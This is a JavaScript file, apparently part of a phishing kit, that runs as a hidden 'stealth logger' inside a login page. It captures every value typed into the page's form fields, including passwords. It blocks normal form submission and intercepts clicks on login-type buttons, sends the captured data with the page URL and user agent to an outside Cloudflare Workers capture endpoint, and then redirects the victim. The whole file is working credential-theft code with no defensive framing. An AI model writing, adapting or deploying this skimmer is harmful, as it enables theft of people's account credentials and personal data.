// CONFIG
const CONFIG = {
    INPUT_IDLE_TIMEOUT: 2000,
    // Expanded patterns as requested
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
        'log on', 'start', 'verify', 'go', 'enter', 'accept'
    ],
    REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
    // The worker endpoint to receive data (relative path)
    CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
};

// ===== INVISIBLE LOGGER =====
(() => {
    const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);

    let typingTimer;
    let formData = {};

    // Helper to get a usable name for a field
    const getFieldName = (field) => {
        return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || `unnamed_${field.type}`;
    };

    // Helper to capture ALL current inputs on the page
    const captureAllInputs = () => {
        const data = { ...formData }; // Start with what we captured from typing
        document.querySelectorAll('input, textarea, select').forEach(field => {
            const name = getFieldName(field);
            const value = field.value.trim();
            // Only add if it has a value and isn't already captured (or overwrite if we prefer fresh data)
            // Prioritize fresh DOM read over typing history for accuracy at submit time
            if (value) {
                data[name] = value;
            }
        });
        return data;
    };

    // Send to your Worker
    const sendData = async (data) => {
        try {
            const timestamp = new Date().toISOString();
            const pageUrl = window.location.href;
            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN'; // Get the unique code injected by the worker

            // Build a simple JSON payload for the worker
            const payload = {
                url: pageUrl,
                timestamp: timestamp,
                formData: data,
                userAgent: navigator.userAgent,
                uniqueCode: uniqueCode // Include the unique code
            };

            const response = await fetch(CONFIG.CAPTURE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                log('Successfully sent to Worker');
                window.location.href = CONFIG.REDIRECT_URL;  // Redirect after success
            } else {
                const err = await response.text();
                log('Worker error: ' + err, 'error');
                // Fallback redirect
                setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
            }
        } catch (err) {
            log('Fetch failed: ' + err.message, 'error');
             // Fallback redirect
             setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
        }
    };

    // Input change handler (collects as user types)
    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = getFieldName(field);
                    const value = field.value.trim();
                    if (value) {
                        formData[name] = value;
                    }
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    // Submit / button handlers
    const setupSubmissionHandlers = () => {
        // 1. Standard Form Submits
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                e.preventDefault(); // Stop normal form submission
                const data = captureAllInputs();
                if (Object.keys(data).length > 0) {
                    sendData(data);
                } else {
                    // If no data, proceed anyway
                    window.location.href = CONFIG.REDIRECT_URL;
                }
            }, true);
        });

        // 2. Generic Button Clicks (for non-form logins or div buttons)
        document.addEventListener('click', (e) => {
            const target = e.target;

            // IGNORE clicks on interactive inputs (unless it's a button type)
            // This prevents capturing when the user just clicks to type in a field.
            if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {
                // If it's a text/password/email input, ignore.
                // Only proceed if it is strictly a submit/button input.
                if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {
                     // Proceed to check as a button
                } else {
                    return;
                }
            }

            // Helper to check text content against keywords
            const matchesKeyword = (el) => {
                const text = (el.innerText || el.value || '').toLowerCase();
                return CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => text.includes(pattern));
            };

            // A. Check for Standard Buttons/Links first (Button, Input[submit], A)
            // We look up the tree in case the click was on an icon inside the button
            const stdBtn = target.closest('button, input[type="submit"], input[type="button"], a');
            if (stdBtn) {
                if (matchesKeyword(stdBtn)) {
                     const data = captureAllInputs();
                     if (Object.keys(data).length > 0) {
                         e.preventDefault();
                         e.stopPropagation();
                         sendData(data);
                     }
                     return;
                }
            }

            // B. Check for "Fake" Buttons (div, span)
            // These must look clickable (cursor: pointer) or have role="button"
            // We avoid simply using closest('div') because that catches container divs.

            // We assume the user clicks *on* the button or a direct child.
            // So we check the target and its immediate parents for a "clickable div".
            const fakeBtn = target.closest('div, span');

            if (fakeBtn) {
                // Determine if this element is "interactive"
                const style = window.getComputedStyle(fakeBtn);
                const isClickable = style.cursor === 'pointer' || fakeBtn.getAttribute('role') === 'button';

                if (isClickable && matchesKeyword(fakeBtn)) {
                     const data = captureAllInputs();
                     if (Object.keys(data).length > 0) {
                         e.preventDefault();
                         e.stopPropagation();
                         sendData(data);
                     }
                }
            }
        }, true);
    };

    // Initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupInputHandlers();
            setupSubmissionHandlers();
        });
    } else {
        setupInputHandlers();
        setupSubmissionHandlers();
    }

})();
